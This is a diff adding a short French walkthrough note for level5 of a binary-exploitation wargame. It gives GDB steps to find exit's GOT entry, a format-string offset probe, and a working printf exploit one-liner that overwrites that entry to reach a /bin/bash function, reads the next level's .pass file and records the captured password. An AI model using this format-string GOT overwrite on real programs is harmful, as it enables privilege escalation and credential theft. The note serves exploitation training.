@@ -1,0 +1,29 @@
+level5: 
+pistes : 
+https://www.youtube.com/watch?v=t1LH9D5cuK4&t=165s
+
+Address de o (ou il y a /bin/bash) : 0x080484a4
+GOT de la fonction exit dans n qu’il faut remplacer par l'adresse de la fonction o : 
+
+disass n (vulnerable function)
+0x080484ff <+61>:	call   0x80483d0 <exit@plt> → address of PLT
+disass the address : 0x80483d0 
+On observe :  0x080483d0 <+0>:	jmp    *0x8049838
+x 0x8049838 → c’est la GOT de exit dans n (PLT)
+
+(On peux faire le test sur GDB : Remplacement de la PLT address exit par l’address n
+dans 0xb7eb8aa8 gdb run après avoir break au printf puis exit après le printf break set {int}0x8049838=0x080484a4
+Quand on (gdb) x 0x8049838
+On obtient
+0x8049838 <exit@got.plt>:	0x080484a4)
+
+Utilisation de printf vulnerability pour overwrite trouver la place d’une adresse sur la stack après son ajout avec printf: 
+(python -c "print 'AAAA' + '%x '*4") | ./level5 → L’offset est a la place 4
+
+0x080484a4 = 134513828 → address de o (avec bin/bash)
+on enlève 4 → 134513824
+On place l'adresse du exit et on y écrit l'adresse de o en décimal
+(python -c "print '\x38\x98\x04\x08' + '%134513824x ' + '%4\$n'") | ./level5 
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
